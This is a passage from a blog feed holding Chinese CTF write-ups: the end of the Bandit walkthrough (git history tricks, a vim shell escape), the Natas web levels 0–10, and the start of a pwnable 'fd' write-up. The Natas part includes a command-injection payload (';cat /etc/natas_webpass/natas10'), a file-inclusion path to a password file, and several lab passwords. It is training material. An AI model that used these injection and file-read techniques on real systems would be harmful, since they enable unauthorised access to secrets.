class="line">5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z</span><br></pre></td></tr></table></figure><h2 id="Level-26➡Level-27"><a href="#Level-26➡Level-27" class="headerlink" title="Level_26➡Level_27"></a>Level_26➡Level_27</h2><p>和上一关差不多。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:sh</span><br></pre></td></tr></table></figure><p>进入后:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27</span><br><span class="line">3ba3118a22e93127a4ed485be72ef5ea</span><br></pre></td></tr></table></figure><h2 id="Level-27➡Level-28"><a href="#Level-27➡Level-28" class="headerlink" title="Level_27➡Level_28"></a>Level_27➡Level_28</h2><h2 id="Learn-about-Git"><a href="#Learn-about-Git" class="headerlink" title="Learn about Git"></a><strong>Learn about Git</strong></h2><p>参阅阮一峰这篇：</p><p><a href="https://www.liaoxuefeng.com/wiki/896043488029600">clink_me</a></p><p>git clone 克隆一个项目：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bandit27@bandit:/tmp/what_a_fuck$ git <span class="built_in">clone</span> ssh://bandit27-git@localhost/home/bandit27-git/repo</span><br><span class="line">bandit27@bandit:/tmp/what_a_fuck$ ls</span><br><span class="line">repo</span><br><span class="line">bandit27@bandit:/tmp/what_a_fuck$ <span class="built_in">cd</span> repo/</span><br><span class="line">bandit27@bandit:/tmp/what_a_fuck/repo$ ls</span><br><span class="line">README</span><br><span class="line">bandit27@bandit:/tmp/what_a_fuck/repo$ cat README</span><br><span class="line">The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2</span><br></pre></td></tr></table></figure><h2 id="Level-28➡Level-29"><a href="#Level-28➡Level-29" class="headerlink" title="Level_28➡Level_29"></a>Level_28➡Level_29</h2><p>和上一关差不多，但并没有直接给flag，可以利用git log 命令查看修改信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">bandit28@bandit:/tmp/what_a_fuck/repo$ git <span class="built_in">log</span></span><br><span class="line">commit edd935d60906b33f0619605abd1689808ccdd5ee</span><br><span class="line">Author: Morla Porla &lt;morla@overthewire.org&gt;</span><br><span class="line">Date:   Thu May 7 20:14:49 2020 +0200</span><br><span class="line"></span><br><span class="line">    fix info leak   <span class="comment">#修复信息泄露</span></span><br><span class="line"></span><br><span class="line">commit c086d11a00c0648d095d04c089786efef5e01264</span><br><span class="line">Author: Morla Porla &lt;morla@overthewire.org&gt;</span><br><span class="line">Date:   Thu May 7 20:14:49 2020 +0200</span><br><span class="line"></span><br><span class="line">    add missing data <span class="comment">#添加缺少的信息</span></span><br><span class="line"></span><br><span class="line">commit de2ebe2d5fd1598cd547f4d56247e053be3fdc38</span><br><span class="line">Author: Ben Dover &lt;noone@overthewire.org&gt;</span><br><span class="line">Date:   Thu May 7 20:14:49 2020 +0200</span><br><span class="line"></span><br><span class="line">    initial commit of README.md <span class="comment">#最初的信息</span></span><br></pre></td></tr></table></figure><p>很明显比较修复信息泄露的提交和上一个提交即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bandit28@bandit:/tmp/what_a_fuck/repo$ git diff  c086 edd9</span><br><span class="line">diff --git a/README.md b/README.md</span><br><span class="line">index 3f7cee8..5c6457b 100644</span><br><span class="line">--- a/README.md</span><br><span class="line">+++ b/README.md</span><br><span class="line">@@ -4,5 +4,5 @@ Some notes <span class="keyword">for</span> level29 of bandit.</span><br><span class="line"> <span class="comment">## credentials</span></span><br><span class="line"> </span><br><span class="line"> - username: bandit29</span><br><span class="line">-- password: bbc96594b4e001778eee9975372716b2</span><br><span class="line">+- password: xxxxxxxxxx</span><br></pre></td></tr></table></figure><h2 id="Level-29➡Level-30"><a href="#Level-29➡Level-30" class="headerlink" title="Level_29➡Level_30"></a>Level_29➡Level_30</h2><h2 id="Learn-about-branch-of-git"><a href="#Learn-about-branch-of-git" class="headerlink" title="Learn about branch of git:"></a>Learn about <strong>branch</strong> of git:</h2><p>官方文档：<a href="https://git-scm.com/book/en/v2/Git-Branching-Branches-in-a-Nutshell">yyds</a></p><p>:)阅读官方文档的时候英语的作用就体现出来了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">bandit29@bandit:/tmp/what_a_fuck/repo$ git branch -a   <span class="comment">#查看所有分支</span></span><br><span class="line">* master</span><br><span class="line">  remotes/origin/HEAD -&gt; origin/master</span><br><span class="line">  remotes/origin/dev</span><br><span class="line">  remotes/origin/master</span><br><span class="line">  remotes/origin/sploits-dev</span><br><span class="line">bandit29@bandit:/tmp/what_a_fuck/repo$ git checkout dev <span class="comment">#切换到其他分支</span></span><br><span class="line">Switched to branch <span class="string">&#x27;dev&#x27;</span></span><br><span class="line">bandit29@bandit:/tmp/what_a_fuck/repo$ git <span class="built_in">log</span></span><br><span class="line">commit bc833286fca18a3948aec989f7025e23ffc16c07</span><br><span class="line">Author: Morla Porla &lt;morla@overthewire.org&gt;</span><br><span class="line">Date:   Thu May 7 20:14:52 2020 +0200</span><br><span class="line"></span><br><span class="line">    add data needed <span class="keyword">for</span> development        <span class="comment">#该分支下可能有flag</span></span><br><span class="line"></span><br><span class="line">commit 8e6c203f885bd4cd77602f8b9a9ea479929ffa57</span><br><span class="line">Author: Ben Dover &lt;noone@overthewire.org&gt;</span><br><span class="line">Date:   Thu May 7 20:14:51 2020 +0200</span><br><span class="line"></span><br><span class="line">    add gif2ascii</span><br><span class="line"></span><br><span class="line">commit 208f463b5b3992906eabf23c562eda3277fea912</span><br><span class="line">Author: Ben Dover &lt;noone@overthewire.org&gt;</span><br><span class="line">Date:   Thu May 7 20:14:51 2020 +0200</span><br><span class="line"></span><br><span class="line">    fix username</span><br><span class="line"></span><br><span class="line">commit 18a6fd6d5ef7f0874bbdda2fa0d77b3b81fd63f7</span><br><span class="line">Author: Ben Dover &lt;noone@overthewire.org&gt;</span><br><span class="line">Date:   Thu May 7 20:14:51 2020 +0200</span><br><span class="line"></span><br><span class="line">    initial commit of README.md</span><br><span class="line">bandit29@bandit:/tmp/what_a_fuck/repo$ cat README.md <span class="comment">#查看READM.md</span></span><br><span class="line"><span class="comment"># Bandit Notes</span></span><br><span class="line">Some notes <span class="keyword">for</span> bandit30 of bandit.</span><br><span class="line"></span><br><span class="line"><span class="comment">## credentials</span></span><br><span class="line"></span><br><span class="line">- username: bandit30</span><br><span class="line">- password: 5b90576bedb2cc04c86a9e924ce42faf</span><br></pre></td></tr></table></figure><h2 id="Level-30➡Level-31"><a href="#Level-30➡Level-31" class="headerlink" title="Level_30➡Level_31"></a>Level_30➡Level_31</h2><h2 id="Learn-about-the-git-show"><a href="#Learn-about-the-git-show" class="headerlink" title="Learn about the git show"></a><strong>Learn about the git show</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git show-ref <span class="comment">#显示所有本地库储存的所有可能的引用以及关联的提醒</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">3aa4c239f729b07deb99a52f125893e162daac9e refs/heads/master</span><br><span class="line">3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/HEAD</span><br><span class="line">3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/master</span><br><span class="line">f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secret</span><br><span class="line">git show f171即可get flag</span><br><span class="line">47e603bb428404d265f59c42920d81e5</span><br></pre></td></tr></table></figure><h2 id="Level-31➡Level-32"><a href="#Level-31➡Level-32" class="headerlink" title="Level_31➡Level_32"></a>Level_31➡Level_32</h2><h2 id="Learn-about-push-and-commit-of-git"><a href="#Learn-about-push-and-commit-of-git" class="headerlink" title="Learn about  push and commit of git"></a><strong>Learn about  push and commit of git</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bandit31@bandit:/tmp/sanshiyiguan/repo$ cat README.md </span><br><span class="line">This time your task is to push a file to the remote repository.</span><br><span class="line"></span><br><span class="line">Details:</span><br><span class="line">    File name: key.txt</span><br><span class="line">    Content: <span class="string">&#x27;May I come in?&#x27;</span></span><br><span class="line">    Branch: master</span><br></pre></td></tr></table></figure><p>查看信息应该是让我们用master分支把包含’May I come in?’的key.txt提交到远程仓库</p><p>vim 编辑该文档然后添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add key.txt -f</span><br></pre></td></tr></table></figure><p>关于 <a href="https://git-scm.com/docs/git-commit">commit</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m  <span class="string">&quot;wuhu~I_got_it&quot;</span></span><br></pre></td></tr></table></figure><p>The last step:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">remote: Well done! Here is the password for the next level:</span><br><span class="line">remote: 56a9bf19c63d650ce78e6ec0354ee45e</span><br></pre></td></tr></table></figure><h2 id="Level-32➡Level-33"><a href="#Level-32➡Level-33" class="headerlink" title="Level_32➡Level_33"></a>Level_32➡Level_33</h2><p>Analyse:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; ls</span><br><span class="line">sh: 1: LS: not found</span><br><span class="line">&gt;&gt; whoami</span><br><span class="line">sh: 1: WHOAMI: not found</span><br></pre></td></tr></table></figure><p>登录后弹出一个大写的SHELL终端，测试发现我们所有的命令都会被转换为大写。</p><p>根据Tips: sh 和 man 查阅man sh文档 找到了一些信息，可以用$0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Expands to the name of the shell or shell script.  </span><br><span class="line">This is set at shell initialization.  </span><br><span class="line">If bash is invoked with a file of commands, $0 is set  to  the  name  of that file.  </span><br><span class="line">If bash is started with the -c option, then $0 is set to the first argument after the string to be executed, if one is present. </span><br><span class="line">Otherwise, it is set to the file name used to invoke bash, as given by argument zero.</span><br></pre></td></tr></table></figure><h2 id="What’s-0"><a href="#What’s-0" class="headerlink" title="What’s  $0"></a><strong>What’s  $0</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In bash, $n (where “n” represents a number), refers to the nth argument of a command call. $1 would be the first parameter, $2 the second, and so forth. $0 refers to the command itself. As we figured out above that our input is passed on to an sh call, $0 will be referencing sh itself, starting a new shell (without the UPPERCASE mechanics).</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/bandit_pass/bandit33</span><br><span class="line">c9c3199ddf4121b10cf581a98d51caee</span><br></pre></td></tr></table></figure><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><p>题目非常平易近人，引导着学习基本Linux命令、linux文件、用户管理等、Git命令等知识。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;linux-base题解&quot;&gt;&lt;a href=&quot;#linux-base题解&quot; class=&quot;headerlink&quot; title=&quot;linux_base题解&quot;&gt;&lt;/a&gt;linux_base题解&lt;/h1&gt;&lt;p&gt;重新系统地过一遍，主要是一些Linux的基本命令和基础知识。</summary>
      
    
    
    
    <category term="linux" scheme="http://example.com/categories/linux/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="linux" scheme="http://example.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Web题解_natas</title>
    <link href="http://example.com/2021/04/20/Web_1/"/>
    <id>http://example.com/2021/04/20/Web_1/</id>
    <published>2021-04-20T01:04:24.027Z</published>
    <updated>2021-04-22T01:48:24.188Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web题解-natas"><a href="#Web题解-natas" class="headerlink" title="Web题解_natas"></a>Web题解_natas</h1><p>Easy_web入门刷题</p><h2 id="Level-0"><a href="#Level-0" class="headerlink" title="Level_0"></a><strong>Level_0</strong></h2><p>Check Souce code</p><h2 id="Level-0➡Level-1"><a href="#Level-0➡Level-1" class="headerlink" title="Level_0➡Level_1"></a><strong>Level_0➡Level_1</strong></h2><p>Check Souce code</p><h2 id="Level-1➡Level-2"><a href="#Level-1➡Level-2" class="headerlink" title="Level_1➡Level_2"></a><strong>Level_1➡Level_2</strong></h2><p>发现有个png图片，访问上级目录可查看到有flag的txt文档</p><h2 id="Level-2➡Level-3"><a href="#Level-2➡Level-3" class="headerlink" title="Level_2➡Level_3"></a><strong>Level_2➡Level_3</strong></h2><h2 id="Robots协议"><a href="#Robots协议" class="headerlink" title="Robots协议"></a><strong>Robots协议</strong></h2><p>访问/robots.txt查看到存在目录/s3cr3t/访问即可得到flag</p><h2 id="Level-3➡Level-4"><a href="#Level-3➡Level-4" class="headerlink" title="Level_3➡Level_4"></a><strong>Level_3➡Level_4</strong></h2><p>根据提示用Burpsuite抓包改HTTPReferer发送即可</p><h2 id="Level-4➡Level-5"><a href="#Level-4➡Level-5" class="headerlink" title="Level_4➡Level_5"></a><strong>Level_4➡Level_5</strong></h2><h2 id="Learn-about-cookie"><a href="#Learn-about-cookie" class="headerlink" title="Learn about cookie"></a><strong>Learn about cookie</strong></h2><p>更改cookie中Loggedin 值为1即可</p><h2 id="Level-5➡Level-6"><a href="#Level-5➡Level-6" class="headerlink" title="Level_5➡Level_6"></a><strong>Level_5➡Level_6</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;includes/secret.inc&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">&quot;submit&quot;</span>, <span class="variable">$_POST</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$secret</span> == <span class="variable">$_POST</span>[<span class="string">&#x27;secret&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">print</span><span class="string">&quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">print</span><span class="string">&quot;Wrong secret&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现导入了”includes/secret.inc” ，比较的时候访问该目录可看到密码，提交即可</p><h2 id="Level-6➡Level-7"><a href="#Level-6➡Level-7" class="headerlink" title="Level_6➡Level_7"></a><strong>Level_6➡Level_7</strong></h2><p>include()文件包含漏洞，用户传入的page参数未经过滤直接调用include()函数，传入/etc/natas_webpass/natas8作为参数即可。</p><h2 id="Level-7➡Level-8"><a href="#Level-7➡Level-8" class="headerlink" title="Level_7➡Level_8"></a><strong>Level_7➡Level_8</strong></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$encodedSecret</span> = <span class="string">&quot;3d3d516343746d4d6d6c315669563362&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encodeSecret</span>(<span class="params"><span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bin2hex(strrev(base64_encode(<span class="variable">$secret</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">&quot;submit&quot;</span>, <span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span>(encodeSecret(<span class="variable">$_POST</span>[<span class="string">&#x27;secret&#x27;</span>]) == <span class="variable">$encodedSecret</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Wrong secret&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据加密过程解密即可</p><p>练习一下python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">byte=<span class="string">b&#x27;\x3d\x3d\x51\x63\x43\x74\x6d\x4d\x6d\x6c\x31\x56\x69\x56\x33\x62&#x27;</span></span><br><span class="line">t=byte.decode()</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line">t=t[::-<span class="number">1</span>]<span class="comment">#字符切片</span></span><br><span class="line"><span class="built_in">print</span>(t) </span><br><span class="line">t=base64.b64decode(t)</span><br><span class="line"><span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure><p>练习一下linux命令</p><p>优雅简洁:)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 3d3d516343746d4d6d6c315669563362 | xxd -p -r | rev | base64 -d</span><br></pre></td></tr></table></figure><p><em>-r</em> | <em>-revert</em></p><p>reverse operation: convert (or patch) hexdump into binary. If not writing to stdout, xxd writes into its output file without truncating it. <strong>Use the combination <em>-r</em> -p to read plain hexadecimal dumps without line number information and without a particular column layout.</strong> Additional Whitespace and line-breaks are allowed anywhere.</p><h2 id="Level-8➡Level-9"><a href="#Level-8➡Level-9" class="headerlink" title="Level_8➡Level_9"></a><strong>Level_8➡Level_9</strong></h2><h2 id="Learn-about-passthru"><a href="#Learn-about-passthru" class="headerlink" title="Learn about passthru()"></a><strong>Learn about passthru()</strong></h2><p>passtru():exec() 函数类似， passthru() 函数也是用来执行外部命令（ command ）的。 </p><p>用户输入未过滤，直接用 ; 截断grep 命令cat flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat /etc/natas_webpass/natas10</span><br></pre></td></tr></table></figure><h2 id="Level-9➡Level-10"><a href="#Level-9➡Level-10" class="headerlink" title="Level_9➡Level_10"></a><strong>Level_9➡Level_10</strong></h2><p>注意到对用户输入进行过滤，但只是过滤了; | &amp;特殊字符</p><h2 id="Uage-of-grep-and-regex"><a href="#Uage-of-grep-and-regex" class="headerlink" title="Uage of grep and regex"></a><strong>Uage of grep and regex</strong></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;[A-Za-z]&#x27;</span> 文件名</span><br></pre></td></tr></table></figure><p>Demo:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[a-zA-Z] /etc/natas_webpass/natas11</span><br><span class="line">Or</span><br><span class="line">. /etc/natas_webpass/natas11</span><br></pre></td></tr></table></figure><h2 id="Level-10➡Level-11"><a href="#Level-10➡Level-11" class="headerlink" title="Level_10➡Level_11"></a><strong>Level_10➡Level_11</strong></h2><h2 id="Level-11➡Level-12"><a href="#Level-11➡Level-12" class="headerlink" title="Level_11➡Level_12"></a><strong>Level_11➡Level_12</strong></h2><h2 id="Level-12➡Level-13"><a href="#Level-12➡Level-13" class="headerlink" title="Level_12➡Level_13"></a><strong>Level_12➡Level_13</strong></h2><h2 id="Level-13➡Level-14"><a href="#Level-13➡Level-14" class="headerlink" title="Level_13➡Level_14"></a><strong>Level_13➡Level_14</strong></h2><h2 id="Level-14➡Level-15"><a href="#Level-14➡Level-15" class="headerlink" title="Level_14➡Level_15"></a><strong>Level_14➡Level_15</strong></h2><h2 id="Level-15➡Level-16"><a href="#Level-15➡Level-16" class="headerlink" title="Level_15➡Level_16"></a><strong>Level_15➡Level_16</strong></h2><h2 id="Level-16➡Level-17"><a href="#Level-16➡Level-17" class="headerlink" title="Level_16➡Level_17"></a><strong>Level_16➡Level_17</strong></h2><h2 id="Level-17➡Level-18"><a href="#Level-17➡Level-18" class="headerlink" title="Level_17➡Level_18"></a><strong>Level_17➡Level_18</strong></h2><h2 id="Level-18➡Level-19"><a href="#Level-18➡Level-19" class="headerlink" title="Level_18➡Level_19"></a><strong>Level_18➡Level_19</strong></h2><h2 id="Level-19➡Level-20"><a href="#Level-19➡Level-20" class="headerlink" title="Level_19➡Level_20"></a><strong>Level_19➡Level_20</strong></h2><h2 id="Level-20➡Level-21"><a href="#Level-20➡Level-21" class="headerlink" title="Level_20➡Level_21"></a><strong>Level_20➡Level_21</strong></h2><h2 id="Level-21➡Level-22"><a href="#Level-21➡Level-22" class="headerlink" title="Level_21➡Level_22"></a><strong>Level_21➡Level_22</strong></h2><h2 id="Level-22➡Level-23"><a href="#Level-22➡Level-23" class="headerlink" title="Level_22➡Level_23"></a><strong>Level_22➡Level_23</strong></h2><h2 id="Level-23➡Level-24"><a href="#Level-23➡Level-24" class="headerlink" title="Level_23➡Level_24"></a><strong>Level_23➡Level_24</strong></h2><h2 id="Level-24➡Level-25"><a href="#Level-24➡Level-25" class="headerlink" title="Level_24➡Level_25"></a><strong>Level_24➡Level_25</strong></h2><h2 id="Level-25➡Level-26"><a href="#Level-25➡Level-26" class="headerlink" title="Level_25➡Level_26"></a><strong>Level_25➡Level_26</strong></h2><h2 id="Level-26➡Level-27"><a href="#Level-26➡Level-27" class="headerlink" title="Level_26➡Level_27"></a><strong>Level_26➡Level_27</strong></h2><h2 id="Level-27➡Level-28"><a href="#Level-27➡Level-28" class="headerlink" title="Level_27➡Level_28"></a><strong>Level_27➡Level_28</strong></h2><h2 id="Level-28➡Level-29"><a href="#Level-28➡Level-29" class="headerlink" title="Level_28➡Level_29"></a><strong>Level_28➡Level_29</strong></h2><h2 id="Level-29➡Level-30"><a href="#Level-29➡Level-30" class="headerlink" title="Level_29➡Level_30"></a><strong>Level_29➡Level_30</strong></h2><h2 id="Level30➡Level31"><a href="#Level30➡Level31" class="headerlink" title="Level30➡Level31"></a><strong>Level<em>30➡Level</em></strong>31</h2><h2 id="Level-31➡Level-32"><a href="#Level-31➡Level-32" class="headerlink" title="Level_31➡Level_32"></a><strong>Level_31➡Level_32</strong></h2><h2 id="Level-32➡Level-33"><a href="#Level-32➡Level-33" class="headerlink" title="Level_32➡Level_33"></a><strong>Level_32➡Level_33</strong></h2><h2 id="Level33➡Level34"><a href="#Level33➡Level34" class="headerlink" title="Level33➡Level34"></a><strong>Level<em>33➡Level</em></strong>34</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Web题解-natas&quot;&gt;&lt;a href=&quot;#Web题解-natas&quot; class=&quot;headerlink&quot; title=&quot;Web题解_natas&quot;&gt;&lt;/a&gt;Web题解_natas&lt;/h1&gt;&lt;p&gt;Easy_web入门刷题&lt;/p&gt;
&lt;h2 id=&quot;Level-0&quot;&gt;</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable_game题解_1</title>
    <link href="http://example.com/2021/04/20/Pwn_1/"/>
    <id>http://example.com/2021/04/20/Pwn_1/</id>
    <published>2021-04-19T16:59:27.486Z</published>
    <updated>2021-04-20T00:51:21.326Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pwnable-games"><a href="#Pwnable-games" class="headerlink" title="Pwnable_games"></a>Pwnable_games</h1><p>开始刷题啦！冲冲冲！本贴记录主要记录知识点和exp</p><h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p><strong>Tips:</strong></p><p><strong>main函数的三个参数</strong></p><p>int argc</p><p>int型变量，表示传递给main函数的参数数量。</p><p>char *argv</p><p>指针数组，每个指针指向各个具体的参数。</p><p>char*envp</p><p>环境变量，可以为程序运行过程中需要使用环境变量做参考。</p><p>Demo:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./hello   //执行该文件</span><br></pre></td></tr></table></figure><p>此时argc=1,表示只有一个参数输入</p><p>argv只有一个元素,argv[0]指向输入程序路径及名称: ./hello</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./hello para_1</span><br></pre></td></tr></table></figure><p>此时argc=2,有两个参数传入</p><p>argc[0]指向输入程序路径及名称 “./hello”</p><p>argv[1]指向para_1字符串</p><p><strong>Linux 文件IO部分理解</strong></p><p>所有的I/O设备都被模型化为文件，而所有的输入和输出都被当做相应文件的读和写来执行。这种将设备优雅映射为文件的方式，允许Linux内核引出一个简单、低级的应用接口，称为Unix I/O，这使得所有输入和输出都能以一种统一、一致的方式来执行：</p><ul><li><p>打开文件  ： 应用程序通过内核打开相应文件，内核返回一个小的非负整数，叫做描述符，它在后续对此文件的所有操作中标识这个文件。内核记录有关打开文件的所有信息。应用程序只需记住这个描述符。</p></li><li><p><strong>文件描述符fd：</strong></p></li></ul><p>文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。</p><ul><li>Linux shell创建的每个进程开始时都有三个打开的文件：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">stdin 标准输入的文件标识符为0     </span><br><span class="line"></span><br><span class="line">stdout 标准输出的文件标识符为1</span><br><span class="line"></span><br><span class="line">stderr 标准错误输出的文件标识符为2</span><br></pre></td></tr></table></figure><p><strong>Exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 